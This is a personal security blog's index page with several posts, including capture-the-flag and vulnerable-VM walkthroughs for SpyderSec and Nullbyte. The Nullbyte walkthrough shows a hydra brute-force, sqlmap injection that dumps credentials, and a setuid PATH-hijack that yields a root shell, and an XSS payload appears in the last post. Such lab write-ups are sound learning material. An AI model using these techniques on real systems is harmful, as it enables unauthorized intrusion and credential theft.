<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="generator" content="Hugo 0.15" />

  
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title> Unlogic &middot; Unlogic </title>

  
  <link rel="stylesheet" href="http://unlogic.co.uk/css/poole.css">
  <link rel="stylesheet" href="http://unlogic.co.uk/css/syntax.css">
  <link rel="stylesheet" href="http://unlogic.co.uk/css/hyde.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://unlogic.co.uk/apple-touch-icon-144-precomposed.png">
  <link rel="shortcut icon" href="http://unlogic.co.uk/favicon.png">

  
  <link href="http://unlogic.co.uk/index.xml" rel="alternate" type="application/rss+xml" title="Unlogic" />
</head>

<body class="">

<div class="sidebar">
  <div class="container sidebar-sticky">
    <div class="sidebar-about">
      <a href="http://unlogic.co.uk/"><h1>Unlogic</h1></a>
      <p class="lead">
       I have a keyboard, a compiler, and a whole load of luck 
      </p>
    </div>

    <ul class="sidebar-nav">
      <li><a href="http://unlogic.co.uk/">Home</a> </li>
      
    </ul>

    <p>Sven Steinbauer</p>
  </div>
</div>


    <div class="content container">
<div class="posts">

      
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/12/04/brewing-with-a-pi/">
        Brewing with a Pi
      </a>
    </h1>

    <span class="post-date">Fri, Dec 4, 2015</span>

    <p>It&rsquo;s been a while since I&rsquo;ve written here, but that doesn&rsquo;t mean I haven&rsquo;t
been busy. I&rsquo;ve been working on a DIY version of <a href="http://www.speidels-braumeister.de/en/braumeister/id-10-20-50-litre-braumeister.html">Speidel&rsquo;s Braumeister</a>
and the software side of things has come along quite nicely.</p>

<p>The idea is to have a Raspberry Pi controlled beer brewing system for cooking
the wort across a temperature profile. Much like the Braumeister, or Grainfather
style brewers. A probe monitors the temperature and will switch the heating on and
off to maintain the current temperature. You can set how long to hold each temperature
for and it will just plod through the profile.</p>

<p>You can also set and hold a temperature if you want to simply heat the wort. A
pump running at intervals will also be operational during the brew.</p>

<p>As I said, the software side is coming along, and I&rsquo;ve done a quick test with a Pi
and the DS18B20 thermo probe, and that&rsquo;s also working. Next up I need to
get myself a dedicated Pi (perhaps the new Pi Zero) and the rest of the kit, including
vessels, piping, heating etc. It probably won&rsquo;t be fancy stainless steel like the
Braumeister, but it should achieve the same end result.
Once done I will write a complete build process, and the project will be open
source so everyone can use and improve upon it.</p>

<p>But more about the software, it&rsquo;s running on <a href="https://cherrypy.org">CherryPy</a> and
currently looks like this:</p>

<p><a href="http://i.imgur.com/c4IR4yT.png">
<figure >
    
        <img src="http://i.imgur.com/c4IR4yT.png" />
    
    
</figure>
</a>

<figure >
    
        <img src="http://i.imgur.com/c4IR4yT.png" />
    
    
    <figcaption>
        <h4>Brewpy interface</h4>
        
    </figcaption>
    
</figure>
</p>

<p>I&rsquo;ve put the <a href="https://github.com/Svenito/brewpy">code on Github</a> already, so if
you are keen and fancy building the rest of the kit yourself already, please
check it out.</p>

<p>Hopefully I&rsquo;ll get the time to put the rest of the project together early
next year. Got a house to get up to speed as well, so time is a little limited.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/09/09/spydersec-solution/">
        SpyderSec solution
      </a>
    </h1>

    <span class="post-date">Wed, Sep 9, 2015</span>

    <p>Another day, another VM. Today it&rsquo;s the <a href="https://www.vulnhub.com/entry/spydersec-challenge,128/">SpyderSec Challenge</a></p>

<p>So let me start it up and get on it.</p>


<figure >
    
        <img src="http://i.imgur.com/nah3Wah.gif" />
    
    
</figure>


<p>As per usual I need the IP of the machine and
the services it has running (if any). Straight from the Unlogic Cookbook</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/Downloads# nmap -sn 192.168.56.0/24

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.1
Host is up (0.00039s latency).
MAC Address: 0A:00:27:00:00:00 (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00017s latency).
MAC Address: 08:00:27:FF:57:41 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.101
Host is up (0.00028s latency).
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 1.77 seconds

root@kali:~/Downloads# nmap -p- -sV 192.168.56.101

Starting Nmap 6.49BETA4 ( https://nmap.org ) at 2015-09-09 16:07 BST
Nmap scan report for 192.168.56.101
Host is up (0.00049s latency).
Not shown: 65533 filtered ports
PORT   STATE  SERVICE VERSION
22/tcp closed ssh
80/tcp open   http    Apache httpd
MAC Address: 08:00:27:56:11:10 (Cadmus Computer Systems)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.80 seconds
</pre></div>


<p>Lucky me, only one service running, and it&rsquo;s good old http at that.
Let&rsquo;s take a look at that page then:</p>

<p><a href="http://i.imgur.com/IiA6MlY.png">
<figure >
    
        <img src="http://i.imgur.com/IiA6MlY.png" />
    
    
</figure>
</a></p>

<p>Without wasting much time, let&rsquo;s get to the clue hunting. First things first: check the source.
And there&rsquo;s clue number one, right between those script tags. It evals a function which seems to
do some text processing. I&rsquo;ll open Firebug to see if that shows anything interesting, and sure
enough</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #a6e22e">SyntaxError</span><span style="color: #f92672">:</span> <span style="color: #a6e22e">missing</span> <span style="color: #f8f8f2">;</span> <span style="color: #a6e22e">before</span> <span style="color: #a6e22e">statement</span>
    <span style="color: #ae81ff">61</span><span style="color: #f92672">:</span><span style="color: #ae81ff">6</span><span style="color: #a6e22e">c</span><span style="color: #f92672">:</span><span style="color: #ae81ff">65</span><span style="color: #f92672">:</span><span style="color: #ae81ff">72</span><span style="color: #f92672">:</span><span style="color: #ae81ff">74</span><span style="color: #f92672">:</span><span style="color: #ae81ff">28</span><span style="color: #f92672">:</span><span style="color: #ae81ff">27</span><span style="color: #f92672">:</span><span style="color: #ae81ff">6</span><span style="color: #a6e22e">d</span><span style="color: #f92672">:</span><span style="color: #ae81ff">75</span><span style="color: #f92672">:</span><span style="color: #ae81ff">6</span><span style="color: #a6e22e">c</span><span style="color: #f92672">:</span><span style="color: #ae81ff">64</span><span style="color: #f92672">:</span><span style="color: #ae81ff">65</span><span style="color: #f92672">:</span><span style="color: #ae81ff">72</span><span style="color: #f92672">:</span><span style="color: #ae81ff">2</span><span style="color: #a6e22e">e</span><span style="color: #f92672">:</span><span style="color: #ae81ff">66</span><span style="color: #f92672">:</span><span style="color: #ae81ff">62</span><span style="color: #f92672">:</span><span style="color: #ae81ff">69</span><span style="color: #f92672">:</span><span style="color: #ae81ff">27</span><span style="color: #f92672">:</span><span style="color: #ae81ff">29</span><span style="color: #f92672">:</span><span style="color: #ae81ff">3</span><span style="color: #a6e22e">b</span>
</pre></div>


<p>So that&rsquo;s the output from the eval. It throws an error because the result isn&rsquo;t valid
javascript. It seems to me as though it might be HEX. I&rsquo;ll put it through Burp&rsquo;s decoder and
sure enough it resolves to <code>a:l:e:r:t:(:':m:u:l:d:e:r:.:f:b:i:':):;</code>. That&rsquo;s not going to
affect the page in any way, but I&rsquo;m sure it&rsquo;s a clue. I&rsquo;ll note it down and carry on exploring.</p>

<p>The CSS contains a base64 encoded gif. I decided to investigate it by converting it to a file
and opening it in Gimp to examine it. Nothing much of interest there either. Hexdump also shows
nothing of note.</p>

<p>Ok then, apart from that there&rsquo;s nothing of interest in the source, so let me move onto the images on the page.
There&rsquo;s two images: <code>Challenge.png</code> and <code>SpyderSecLogo200.png</code>. On first glance they appear to
have nothing special about them, but once examined with <code>exiftool</code> I see something of interest</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/spydersec# exiftool Challenge.png 
ExifTool Version Number         : 9.74
File Name                       : Challenge.png
Directory                       : .
File Size                       : 83 kB
File Modification Date/Time     : 2015:09:01 07:25:59+01:00
File Access Date/Time           : 2015:09:09 14:29:25+01:00
File Inode Change Date/Time     : 2015:09:09 14:29:19+01:00
File Permissions                : rw-r--r--
File Type                       : PNG
MIME Type                       : image/png
Image Width                     : 540
Image Height                    : 540
Bit Depth                       : 8
Color Type                      : RGB with Alpha
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Background Color                : 255 255 255
Pixels Per Unit X               : 2835
Pixels Per Unit Y               : 2835
Pixel Units                     : meters
Comment                         : 35:31:3a:35:33:3a:34:36:3a:35:37:3a:36:34:3a:35:38:3a:33:35:3a:
                                  37:31:3a:36:34:3a:34:35:3a:36:37:3a:36:61:3a:34:65:3a:37:61:3a:
                                  34:39:3a:33:35:3a:36:33:3a:33:30:3a:37:38:3a:34:32:3a:34:66:3a:
                                  33:32:3a:36:37:3a:33:30:3a:34:61:3a:35:31:3a:33:64:3a:33:64
Image Size                      : 540x540
</pre></div>
</p>

<p>Hex strings are the order of the day here at SpyderSec. So back to Burp&rsquo;s decoder once more
after removing all the colons. The string decodes to another hex string. Same dance again, and
I get a typical base64 string, decode once more and be rewarded with <code>A!Vu~jtH#729sLA;h4%</code>. Which is
not encoded anymore. I make a note of it and carry on sleuthing.</p>

<p>Watch out, here comes the reliable <code>dirbuster</code>. Running it with the regular word list I discover the <code>v</code> subdirectory.
Browsing to that however merely responds with a <code>403 Forbidden</code> reply. I&rsquo;ve not exhausted all the
nooks and crannies yet, there&rsquo;s still that cookie jar to poke at.</p>

<pre><code>Firebug -&gt; Cookie tab -&gt; URI /v/81JHPbvyEQ8729161jd6aKQ0N4/
</code></pre>

<p>Another clue&hellip;. leading me to a subdirectory under <code>v</code>. But that&rsquo;s also forbidden. Well, let
me just plug some of the data we&rsquo;ve found so far into it. The random characters from the
exif data result in a 404, but the string from the javascript alert box however brings up a
download dialog for a file called <code>mulder.fbi</code>.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/spydersec# wget http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
--2015-09-09 17:24:38--  http://192.168.56.101//v/81JHPbvyEQ8729161jd6aKQ0N4/mulder.fbi
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13960421 (13M) [text/plain]
Saving to: ‘mulder.fbi’

mulder.fbi.1            100%[===============================&gt;]  13.31M  5.52MB/s   in 2.4s   

2015-09-09 17:24:41 (5.52 MB/s) - ‘mulder.fbi’ saved [13960421/13960421]

root@kali:~/spydersec# file mulder.fbi 
mulder.fbi: ISO Media, MP4 v2 [ISO 14496-14]
</pre></div>
</p>

<p>A video file, which when I play it, is the song &ldquo;Twilight Time&rdquo; by &ldquo;The Platters&rdquo;.</p>

<p>So here I hit another dead end.</p>

<p>Let me think

<figure >
    
        <img src="http://i.imgur.com/CbfWCmv.gif" />
    
    
</figure>
</p>

<p>I&rsquo;ll take inventory of the clues I have left now:</p>

<ul>
<li>A music video &ldquo;Twilight time&rdquo; titled <em>mulder.fbi</em></li>
<li>A seeming random string <code>A!Vu~jtH#729sLA;h4%</code></li>
</ul>

<p>So I ask myself, why is a video of a song named <em>mulder.fbi</em>? So I do a little research
and after searching for <code>the platters &quot;twilight time&quot; x files</code> I hit this section in a
<a href="https://en.wikipedia.org/wiki/Kill_Switch_(The_X-Files">Wikipedia article</a>)</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">When he puts it into the car stereo, it plays &quot;Twilight Time&quot; 
by The Platters. However, the agents take it to the Lone Gunmen, 
who discover that the disc contains a large quantity of encrypted data
</pre></div>
</p>

<p>Well if that ain&rsquo;t a clue and a bit! Ok, so a little more research of what data you
can hide in a video file (search for <code>hiding files video mp4</code>) I am directed to a
<a href="http://lifehacker.com/5771142/embed-a-truecrypt-volume-in-a-playable-video-file">Lifehacker article</a>
describing the process of hiding Truecrypt volumes in MP4s. It mentions a few ways to
detect such a volume in a video, but to be honest, I might as well just try and mount the volume.
That should be the easiest and quickest way to see if I am on the right track.</p>

<p>Sure enough, there&rsquo;s a volume in the video, but it needs a password. Well there&rsquo;s only
one unused piece of the puzzle left. I plug that in and there&rsquo;s our volume with the <code>flag.txt</code> file
which contains:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">Congratulations! 

You are a winner. 

Please leave some feedback on your thoughts regarding this challenge.
Was it fun? Was it hard enough or too easy? 
What did you like or dislike, what could be done better?

https://www.spydersec.com/feedback
</pre></div>
</p>

<p>Well that was a nice challenge, especially the truecrypt volume in the MP4. That&rsquo;s
something new I learned from this. So thanks to <a href="https://twitter.com/Spydersec">@SpyderSec</a>
for the challenge, and thanks to you for stopping by to read this.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/09/03/extracting-bup-files-in-linux/">
        Extracting bup files in Linux
      </a>
    </h1>

    <span class="post-date">Thu, Sep 3, 2015</span>

    <p>I recently got hold of some malware that got snapped up by McAfee and stored in a bup file.
Keen to take a look at it, I researched how to &lsquo;unbup&rsquo; files and found this page:</p>

<p><a href="http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html">http://blog.opensecurityresearch.com/2012/07/unbup-mcafee-bup-extractor-for-linux.html</a></p>

<p>A slow bash script? A faster script in Perl? No, that won&rsquo;t do. Rather than search
for a Python implementation I decided to use this as an opportunity to write
something, and thus my <code>unbup.py</code> was born. You can get it from my <a href="https://github.com/Svenito/unbup">GitHub</a></p>

<p>It&rsquo;s about as simple as the bash script in terms of features, but it works, and
it is also fairly fast. I&rsquo;ve only tested it with the one file I have, but if
you decide to use it, and it doesn&rsquo;t work, send me the bup file and I&rsquo;ll take a look
at fixing it. Otherwise feel free to fork it and make your own fixes.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/08/25/nullbyte-1-solution/">
        Nullbyte 1 solution
      </a>
    </h1>

    <span class="post-date">Tue, Aug 25, 2015</span>

    

<p>I&rsquo;ve been AFK for a while because of various reasons, but now I&rsquo;m back and have
managed to scrape a little time together to get on with some of <a href="https://vulnhub.com">Vulnhub&rsquo;s</a>
new VMs.</p>

<p>So let&rsquo;s start with <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">Nullbyte 1</a></p>

<h1 id="stage-1:d33d1c43b31d749c4d445e01e4ef8fef">Stage 1</h1>

<p>I ran the usual service discovery and found:</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# nmap -sV 192.168.56.101

Starting Nmap 6.49BETA4 <span style="color: #f92672">(</span> https://nmap.org <span style="color: #f92672">)</span> at 2015-08-25 11:29 BST
Nmap scan report <span style="color: #66d9ef">for</span> 192.168.56.101
Host is up <span style="color: #f92672">(</span>0.00057s latency<span style="color: #f92672">)</span>.
Not shown: <span style="color: #ae81ff">997</span> closed ports
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 <span style="color: #f92672">((</span>Debian<span style="color: #f92672">))</span>
111/tcp open  rpcbind 2-4 <span style="color: #f92672">(</span>RPC <span style="color: #75715e">#100000)</span>
777/tcp open  ssh     OpenSSH 6.7p1 Debian <span style="color: #ae81ff">5</span> <span style="color: #f92672">(</span>protocol 2.0<span style="color: #f92672">)</span>
Service Info: OS: Linux<span style="color: #f8f8f2">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></div>


<p>HTTP server on 80 and ssh on 777. I&rsquo;m going to take the straightforward one, and head
to the HTTP server first.</p>

<p>Upon opening the page I only get an image and some text</p>


<figure >
    
        <img src="http://i.imgur.com/SlVGKol.png" />
    
    
</figure>


<p>I ran <code>dirbuster</code> on the root and got a couple of hits: <code>uploads</code> and <code>phpmyadmin</code>. The first had disabled directory listing
and the second was a no go, but at least told me there was a SQL server available somewhere.</p>

<p>The source of the page doesn&rsquo;t reveal anything else either, so that last place we might be able to find something
is the image itself. There doesn&rsquo;t appear to be any steganography involved here and nothing in the hexdump of the image
either. Well, let me take a look at the EXIF data then.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~/Downloads# exiftool main.gif 
ExifTool Version Number         : 9.74
File Name                       : main.gif
Directory                       : .
File Size                       : <span style="color: #ae81ff">16</span> kB
File Modification Date/Time     : 2015:08:25 10:27:37+01:00
File Access Date/Time           : 2015:08:25 10:28:35+01:00
File Inode Change Date/Time     : 2015:08:25 10:27:37+01:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-<span style="color: #f92672">)</span>: kzMb5nVYJw
Image Size                      : 235x302
</pre></div>


<p>Hrmm, that comment looks unusual. Let&rsquo;s try that in the URL. Initially I got a 404
but that&rsquo;s because I didn&rsquo;t remove the <code>P-):</code>. Hitting <code>http://192.168.56.101/kzMb5nVYJw</code>
takes me to a form asking for a key.</p>

<h1 id="stage-2:d33d1c43b31d749c4d445e01e4ef8fef">Stage 2</h1>

<p>Typing in something random just shows <code>invalid key</code>. Ok, let me take a look at the source,
see where this thing goes.</p>

<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><span style="color: #f92672">&lt;center&gt;</span>
<span style="color: #f92672">&lt;form</span> <span style="color: #a6e22e">method=</span><span style="color: #e6db74">&quot;post&quot;</span> <span style="color: #a6e22e">action=</span><span style="color: #e6db74">&quot;index.php&quot;</span><span style="color: #f92672">&gt;</span>
Key:<span style="color: #f92672">&lt;br&gt;</span>
<span style="color: #f92672">&lt;input</span> <span style="color: #a6e22e">type=</span><span style="color: #e6db74">&quot;password&quot;</span> <span style="color: #a6e22e">name=</span><span style="color: #e6db74">&quot;key&quot;</span><span style="color: #f92672">&gt;</span>
<span style="color: #f92672">&lt;/form&gt;</span> 
<span style="color: #f92672">&lt;/center&gt;</span>
<span style="color: #75715e">&lt;!-- this form isn&#39;t connected to mysql, password ain&#39;t that complex --!&gt;</span>
</pre></div>


<p>Ok, so no SQLi here then, and the password isn&rsquo;t complex either. I&rsquo;m guessing
a simple wordlist might solve this for me. Time to break out <code>hydra</code> for this:</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# hydra 192.168.56.101 http-form-post <span style="color: #e6db74">&quot;/kzMb5nVYJw/index.php:key=^PASS^:invalid key&quot;</span> -l x -P /usr/share/dict/words -t <span style="color: #ae81ff">10</span> -w 30
Hydra v8.1 <span style="color: #f92672">(</span>c<span style="color: #f92672">)</span> <span style="color: #ae81ff">2014</span> by van Hauser/THC - Please <span style="color: #66d9ef">do</span> not use in military or secret service organizations, or <span style="color: #66d9ef">for</span> illegal purposes.

Hydra <span style="color: #f92672">(</span>http://www.thc.org/thc-hydra<span style="color: #f92672">)</span> starting at 2015-08-25 11:41:58
<span style="color: #f92672">[</span>DATA<span style="color: #f92672">]</span> max <span style="color: #ae81ff">10</span> tasks per <span style="color: #ae81ff">1</span> server, overall <span style="color: #ae81ff">64</span> tasks, <span style="color: #ae81ff">99171</span> login tries <span style="color: #f92672">(</span>l:1/p:99171<span style="color: #f92672">)</span>, ~154 tries per task
<span style="color: #f92672">[</span>DATA<span style="color: #f92672">]</span> attacking service http-post-form on port 80
<span style="color: #f92672">[</span>STATUS<span style="color: #f92672">]</span> 18687.00 tries/min, <span style="color: #ae81ff">18687</span> tries in 00:01h, <span style="color: #ae81ff">80484</span> todo in 00:05h, <span style="color: #ae81ff">10</span> active
<span style="color: #f92672">[</span>80<span style="color: #f92672">][</span>http-post-form<span style="color: #f92672">]</span> host: 192.168.56.101   login: x   password: elite
<span style="color: #ae81ff">1</span> of <span style="color: #ae81ff">1</span> target successfully completed, <span style="color: #ae81ff">1</span> valid password found
</pre></div>
</p>

<p>Bingo. Once I enter that into the field I am able to search for usernames.</p>

<h1 id="stage-3:d33d1c43b31d749c4d445e01e4ef8fef">Stage 3</h1>

<p>Entering all sorts of names reveals nothing. At this point I am guessing this
is the part that is backed by a SQL database. Although usernames and the usual
SQLi synbols don&rsquo;t do much, entering nothing dumps multiple records. Maybe I will
try to <code>sqlmap</code> the URL to see if there&rsquo;s any vulnerabilities there</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>

&lt;snip&gt;

<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> GET parameter <span style="color: #e6db74">&#39;usrtosearch&#39;</span> seems to be <span style="color: #e6db74">&#39;MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)&#39;</span> injectable 
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> testing <span style="color: #e6db74">&#39;Generic UNION query (NULL) - 1 to 20 columns&#39;</span>
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> testing <span style="color: #e6db74">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span>
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> automatically extending ranges <span style="color: #66d9ef">for</span> UNION query injection technique tests as there is at least one other <span style="color: #f92672">(</span>potential<span style="color: #f92672">)</span> technique found
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> ORDER BY technique seems to be usable. This should reduce the <span style="color: #f8f8f2">time </span>needed to find the right number of query columns. Automatically extending the range <span style="color: #66d9ef">for</span> current UNION query injection technique <span style="color: #f8f8f2">test</span>
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> target URL appears to have <span style="color: #ae81ff">3</span> columns in query
<span style="color: #f92672">[</span>11:13:26<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> GET parameter <span style="color: #e6db74">&#39;usrtosearch&#39;</span> is <span style="color: #e6db74">&#39;MySQL UNION query (NULL) - 1 to 20 columns&#39;</span> injectable
</pre></div>
</p>

<p>Result! Using this we can now dump the databasenames, tables, and data in the DB</p>

<p>(output shortened for clarity)
<div class="highlight" style="background: #272822"><pre style="line-height: 125%">root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --current-db
back-end DBMS: MySQL 5.0.12
<span style="color: #f92672">[</span>11:13:44<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> fetching current database
current database:    <span style="color: #e6db74">&#39;seth&#39;</span>

root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --tables -D seth
<span style="color: #f92672">[</span>11:13:55<span style="color: #f92672">]</span> <span style="color: #f92672">[</span>INFO<span style="color: #f92672">]</span> fetching tables <span style="color: #66d9ef">for</span> database: <span style="color: #e6db74">&#39;seth&#39;</span>
Database: seth
<span style="color: #f92672">[</span><span style="color: #ae81ff">1</span> table<span style="color: #f92672">]</span>
+-------+
<span style="color: #f8f8f2">|</span> users <span style="color: #f8f8f2">|</span>
+-------+


root@kali:~# sqlmap -u http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch<span style="color: #f92672">=</span>ramses --dump -D seth -T users
Database: seth
Table: users
<span style="color: #f92672">[</span><span style="color: #ae81ff">2</span> entries<span style="color: #f92672">]</span>
+----+---------------------------------------------+--------+------------+
<span style="color: #f8f8f2">|</span> id <span style="color: #f8f8f2">|</span> pass                                        <span style="color: #f8f8f2">|</span> user   <span style="color: #f8f8f2">|</span> position   <span style="color: #f8f8f2">|</span>
+----+---------------------------------------------+--------+------------+
<span style="color: #f8f8f2">|</span> <span style="color: #ae81ff">1</span>  <span style="color: #f8f8f2">|</span> YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE <span style="color: #f8f8f2">|</span> ramses <span style="color: #f8f8f2">|</span> &lt;blank&gt;    <span style="color: #f8f8f2">|</span>
<span style="color: #f8f8f2">|</span> <span style="color: #ae81ff">2</span>  <span style="color: #f8f8f2">|</span> --not allowed--                             <span style="color: #f8f8f2">|</span> isis   <span style="color: #f8f8f2">|</span> employee   <span style="color: #f8f8f2">|</span>
+----+---------------------------------------------+--------+------------+
</pre></div>
</p>

<p>An MD5 hashed password? I best put that through <a href="http://md5decoder.org/">md5decoder</a> to
be rewarded with the password <code>omega</code></p>

<h1 id="stage-4:d33d1c43b31d749c4d445e01e4ef8fef">stage 4</h1>

<p>Turns out that this is ramses&rsquo;s password on the ssh service that&rsquo;s running on
port 777 on the VM. So I&rsquo;ll connect to that and have a look at what&rsquo;s going on there.</p>

<p>Not much in his home directory, so I&rsquo;ll checkout what he&rsquo;s been up to</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:~<span style="color: #f8f8f2">$ </span>cat .bash_history 
sudo -s
su eric
<span style="color: #f8f8f2">exit</span>
ls
clear
<span style="color: #f8f8f2">cd</span> /var/www
<span style="color: #f8f8f2">cd </span>backup/
ls
./procwatch 
clear
sudo -s
<span style="color: #f8f8f2">cd</span> /
ls
<span style="color: #f8f8f2">exit</span>
</pre></div>
</p>

<p>Interesting, ramses has something in <code>/var/www</code>. Seems like a setuid root
binary called <code>procwatch</code>. After running it I would assume that it&rsquo;s just running <code>ps</code>
to return a list of processes. If I run <code>ps</code> on its own, I get the same output (minus
procwatch of course)</p>

<p>So let&rsquo;s see if it calls <code>ps</code> with an absolute path, or not. As a quick test I&rsquo;ll create
a symlink to <code>ls</code> in the current directory and name it <code>ps</code>. Then I set the <code>PATH</code> environment variable
with the current dir at the front.</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>ln -s /bin/ls ps
ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ export PATH</span><span style="color: #f92672">=</span><span style="color: #e6db74">`</span><span style="color: #f8f8f2">pwd</span><span style="color: #e6db74">`</span>:<span style="color: #e6db74">${</span><span style="color: #f8f8f2">PATH</span><span style="color: #e6db74">}</span>
ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>./procwatch 
ls  procwatch  ps  readme.txt
</pre></div>
</p>

<p>Excellent, it just calls <code>ps</code> without a path. A classic issue you can often
find in programs that call other programs.</p>

<p>So let me leverage this to get myself a root shell and ultimately the flag</p>

<p><div class="highlight" style="background: #272822"><pre style="line-height: 125%">ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>ln -snf /bin/sh ps
ramses@NullByte:/var/www/backup<span style="color: #f8f8f2">$ </span>./procwatch 
<span style="color: #75715e"># whoami </span>
root
<span style="color: #75715e"># cat /root/proof.txt</span>
<span style="color: #f92672">[</span>OUTPUT CUT<span style="color: #f92672">]</span>
</pre></div>
</p>

<p>And that concludes the NullByte VM walkthrough. A nice little machine with some fun
challenges. Thanks to ly0n for creating it.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/07/16/honeypotting-with-dionaea-and-raspi/">
        Honeypotting with Dionaea and Raspi
      </a>
    </h1>

    <span class="post-date">Thu, Jul 16, 2015</span>

    <p>I recently setup a <a href="http://dionaea.carnivore.it/">dionaea</a> honeypot on my Raspberry Pi
and after tweaking and configuring it for a few days have now got a working setup.
It&rsquo;s a low interaction honeypot aimed to capture malware rather than ssh bruteforce
attacks.</p>

<p>I plan to leave it online for a week or a month, and the analyse the stats and see
what it managed to collect. So far it&rsquo;s mostly conficker variants, but there&rsquo;s a
suprising (to me) large number of infected machines out there. In one 8 hour period
during testing, it managed to collect 8 unique samples from 154 connections.</p>

<p>Here&rsquo;s the stats from that period:</p>


<figure >
    
        <img src="http://i.imgur.com/j828Fpw.png" />
    
    
</figure>


<p>It should be fairly interesting to see if anything else comes along during its
uptime.</p>

  </div>
  
  <div class="post">
    <h1 class="post-title">
      <a href="http://unlogic.co.uk/2015/06/25/infosec-institute-ctf2-dot-0/">
        Infosec Institute CTF2.0
      </a>
    </h1>

    <span class="post-date">Thu, Jun 25, 2015</span>

    

<p>The folks over at the <a href="https://infosecinstitute.com">Infosec Institue</a> have released
their <a href="http://ctf.infosecinstitute.com/ctf2/">second CTF</a>. Here&rsquo;s how I got on&hellip;</p>

<h1 id="level-01:ad4b2a18d89fa2f20e1d964dd8f70255">Level 01</h1>

<p>In <a href="http://ctf.infosecinstitute.com/ctf2/exercises/ex1.php">level 01</a> I am supposed
to use the provided form to perform a cross site scripting exploit. Here&rsquo;s what the form
looks like:</p>


<figure >
    
        <img src="http://i.imgur.com/CJTNyK4.png" />
    
    
</figure>


<p>At first I might as well test how the form works. Entering something like <code>test</code> and
<code>www.test.com</code> in the fields simply adds the supplied information to the column on the left.
So I try the usual XSS payload: <code>&lt;script&gt;alert(&quot;Ex1&quot;);&lt;/script&gt;</code> in the <code>Site Name</code> field.</p>

<p>A popup tells me that I need to <em>match the requested format</em>. Probably some client side
checks, so I inspect the field with Firebug and notice this:</p>


<figure >
    
